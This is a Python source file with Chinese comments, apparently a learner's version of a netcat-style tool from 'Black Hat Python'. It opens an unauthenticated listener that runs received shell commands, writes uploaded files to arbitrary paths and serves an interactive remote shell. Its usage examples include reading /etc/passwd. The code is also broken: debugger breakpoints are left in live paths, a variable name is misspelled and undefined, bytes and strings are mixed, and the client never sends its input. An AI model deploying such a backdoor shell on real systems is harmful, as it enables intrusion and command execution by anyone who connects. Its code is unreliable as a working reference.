import sys, socket, getopt, threading, subprocess, pdb
# 定义几个全局变量
listen                  = False
command                 = False
upload                  = False
execute                 = ''
target                  = ''
upload_destination      = ''
port                    = ''

def run_command(command):
    pdb.set_trace()
    command = command.rstrip()
    # 运行命令返回结果
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = 'Faild to excute command.\r\n'
    return output

# 实现文件上传、命令行执行、shell相关功能
def client_handler(client_socket):
    global upload
    global execute
    global command
    ##pdb.set_trace()
    # 检测上传文件
    if len(upload_destination):
        # 读取多有字符并写下目标
        fille_buffer = ''

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                fille_buffer += data
        # 将接受数据写入指定文件
        try:
            file_writer = open(upload_destination, 'wb')
            file_writer.write(fille_buffer)
            file_writer.close()
            #确认文件已经写出来
            client_socket.send("Successfully saved file to %s \r\n" % upload_destination)
        except:
            client_socket.send("Faild to saved file to %s \r\n" % upload_destination)
    # 检查命令行执行
    if len(execute):
        out_put = run_command(excute)
        client_socket.send(out_put)

    # 如果需要一个命令行shell，那么我们进入另一个循环
    if command:
        pdb.set_trace()
        while True:
            # 跳出一个窗口
            client_socket.send("<BHP:#> ")
            # 接收数据知道发现换行符
            cmd_buffer = ''
            #pdb.set_trace()
            while '\n' not in cmd_buffer:
                cmd_buffer += str(client_socket.recv(1024))
            # 返还命令行执行输出
            response = run_command(cmd_buffer)
            # 返还相应数据
            client_socket.send(response)

# 创建服务器端的主循环和子函数，用来对命令行shell的创建和命令进行处理
def server_loop():
    global target
    global port

    if not len(target):
        target = '0.0.0.0'
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        #pdb.set_trace()
        # 分拆一个县城处理新的客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket, ))
        client_thread.start()

# 实现client_sender函数
def client_sender(buffer):
    #pdb.set_trace()
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        # (x, y)tuple
        if len(buffer):
                print('buffer1:',buffer)
                #client.send(b'')##直接发送字符串会产生错误，要进行编码
                print('buffer2:',buffer)
        while True:
            recv_len = 1
            response = ''
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
                print(response)
                buffer = input('')
                buffer += '\n'
                client.send(buffer)
    except:
        print('[*] Exception! Exiting.')
        client.close()

# 创建usage函数，进行程序使用帮助
def usage():
    print('one of ChangGong tools')
    print('')
    print('Usage: nettran.py -t target_host -p port')
    print("-l --listen              - listen on [host]:[port] for  incoming connections")
    print('-e --excute=file_to_run  - excute the given file upon receiving a connection')
    print('-c --command             - initianlize a command shell')
    print('-u --upload=destination  - upon reveiving connection upload a file and write to [destination]')
    print('')
    print('')
    print('')
    print('Examples:')
    print('netran.py -t 192.168.0.1 -p 5555 -l -c')
    print('netran.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe')
    print('netran.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"')
    print("echo 'ABCDEFGH' | ./nettran,py -t 192.168.0.1 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # 读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ['help', 'listen', 'execute', 'target', 'port', 'command', 'upload'])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        elif o in ('-c', '--command'):
            command = True
        elif o in ('-u', '--upload'):
            upload_destination = a
        else:
            assert False, 'Unhandled Option'
    # 从标准读入并发送数据
    if not listen and len(target) and port > 0:
        #pdb.set_trace()
        buffer = input('command:')#sys.stdin.read()
        client_sender(buffer)
    # 监听
    # 如果listen为True，建立一个监听套接字，准备处理下一步命令（上传文件，执行命令，开启一个新的命令行shell）
    if listen:
        server_loop()

if __name__ == '__main__':
    main()
